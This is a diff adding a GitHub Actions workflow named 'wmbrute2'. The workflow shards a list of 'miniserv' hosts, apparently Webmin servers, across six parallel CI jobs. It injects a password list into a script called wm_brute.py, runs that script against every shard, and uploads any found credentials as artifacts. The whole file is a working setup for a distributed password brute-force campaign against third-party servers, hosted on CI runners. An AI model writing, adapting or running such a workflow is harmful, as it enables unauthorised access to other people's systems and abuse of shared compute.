@@ -1,0 +1,31 @@
+name: wmbrute2
+on: workflow_dispatch
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0,1,2,3,4,5]
+    steps:
+      - uses: actions/checkout@v4
+      - run: pip install -q requests
+      - name: shard ${{ matrix.shard }}
+        run: |
+          awk -v s=${{ matrix.shard }} 'NR%6==s' miniserv_hosts.txt > s2_${{ matrix.shard }}.txt
+          wc -l s2_${{ matrix.shard }}.txt
+          sed -i 's/^PASSWORDS = \[$/PASSWORDS = [/' wm_brute.py
+          python3 - <<'PY'
+import re
+src=open('wm_brute.py').read()
+pl=open('pwlist2.txt').read().split()
+block="PASSWORDS = " + repr(pl)
+src=re.sub(r"PASSWORDS = \[[^\]]*\]", block, src, flags=re.S)
+open('wm_brute.py','w').write(src)
+print("passwords loaded:", len(pl))
+PY
+          python3 wm_brute.py s2_${{ matrix.shard }}.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with: {name: "wmbrute2-${{ matrix.shard }}", path: "/tmp/wm_brute_hits.json", if-no-files-found: warn}
